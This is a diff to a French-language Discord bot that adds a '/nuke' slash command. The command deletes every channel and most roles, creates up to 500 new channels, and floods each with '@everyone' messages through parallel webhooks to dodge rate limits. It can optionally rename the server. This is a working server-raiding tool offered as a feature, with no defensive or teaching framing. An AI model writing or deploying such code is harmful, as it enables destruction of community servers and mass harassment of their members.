@@ -49,6 +49,114 @@ async def on_guild_join(guild):
     except Exception as e:
         log.exception('on_guild_join sync failed: %s', e)
 
+# ----------------------------- /nuke ----------------------------- #
+
+@bot.tree.command(
+    name='nuke',
+    description='Nuke complet: supprime salons + roles, recree N salons, spam, et renomme le serveur',
+)
+@app_commands.describe(
+    channels='Nombre de salons a creer (defaut: 50)',
+    message='Message a spam dans chaque salon (defaut: @everyone)',
+    repeat='Nombre de messages par salon (defaut: 5)',
+    channel_name='Nom des nouveaux salons (defaut: nuked)',
+    server_name='Nouveau nom du serveur (optionnel)',
+    delete_roles='Supprimer aussi tous les roles (defaut: true)',
+)
+async def nuke(
+    interaction: discord.Interaction,
+    channels: int = 50,
+    message: str = '@everyone',
+    repeat: int = 5,
+    channel_name: str = 'nuked',
+    server_name: str = None,
+    delete_roles: bool = True,
+):
+    await interaction.response.defer(ephemeral=True, thinking=True)
+
+    if interaction.guild is None:
+        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
+        return
+
+    guild = interaction.guild
+    me = guild.me
+
+    if me is None or not me.guild_permissions.administrator:
+        await interaction.followup.send('Le bot doit avoir la permission Administrateur.', ephemeral=True)
+        return
+
+    if channels < 1 or channels > 500:
+        await interaction.followup.send('channels doit etre entre 1 et 500.', ephemeral=True)
+        return
+    if repeat < 1 or repeat > 50:
+        await interaction.followup.send('repeat doit etre entre 1 et 50.', ephemeral=True)
+        return
+
+    start = asyncio.get_event_loop().time()
+    log.info('NUKE launched by %s on guild %s', interaction.user, guild.id)
+
+    # 1) Rename server (en // avec le reste si demande)
+    rename_task = None
+    if server_name:
+        new = server_name.strip()[:100]
+        if len(new) >= 2:
+            rename_task = asyncio.create_task(_safe(guild.edit(name=new, reason=f'/nuke by {interaction.user}')))
+
+    # 2) Suppression PARALLELE de tous les salons + tous les roles supprimables
+    role_targets = [
+        r for r in guild.roles
+        if not r.is_default() and not r.managed and r < me.top_role
+    ] if delete_roles else []
+
+    delete_tasks = [_safe(c.delete(reason='/nuke')) for c in list(guild.channels)]
+    delete_tasks += [_safe(r.delete(reason='/nuke')) for r in role_targets]
+
+    log.info('Deleting %d channels + %d roles...', len(guild.channels), len(role_targets))
+    await asyncio.gather(*delete_tasks)
+
+    # 3) Creation parallele des N nouveaux salons
+    log.info('Creating %d channels...', channels)
+    create_tasks = [
+        _safe(guild.create_text_channel(name=f'{channel_name}-{i+1}', reason='/nuke'))
+        for i in range(channels)
+    ]
+    created = [c for c in await asyncio.gather(*create_tasks) if c is not None]
+
+    # 4) Webhooks paralleles (1 par salon)
+    webhooks = await asyncio.gather(*[_safe(c.create_webhook(name='nuke-hook')) for c in created])
+
+    # 5) Spam parallele via webhooks (rate-limit par-canal -> tres rapide)
+    async def flood(webhook):
+        if webhook is None:
+            return
+        for _ in range(repeat):
+            try:
+                await webhook.send(content=message)
+            except discord.HTTPException as e:
+                log.warning('webhook send failed: %s', e)
+                await asyncio.sleep(0.3)
+
+    await asyncio.gather(*[flood(w) for w in webhooks])
+
+    # 6) Attendre la fin du rename si lance
+    if rename_task:
+        await rename_task
+
+    elapsed = asyncio.get_event_loop().time() - start
+
+    summary = (
+        f'**NUKE termine en {elapsed:.1f}s**\n'
+        f'- {len(created)}/{channels} salons crees\n'
+        f'- {len(role_targets)} roles supprimes\n'
+        f'- {repeat} messages / salon ({len([w for w in webhooks if w])} webhooks)\n'
+        + (f'- Serveur renomme en **{server_name}**\n' if server_name else '')
+    )
+    if created:
+        try:
+            await created[0].send(summary)
+        except Exception:
+            pass
+
 # ----------------------------- /supp-roles ----------------------------- #
 
 @bot.tree.command(
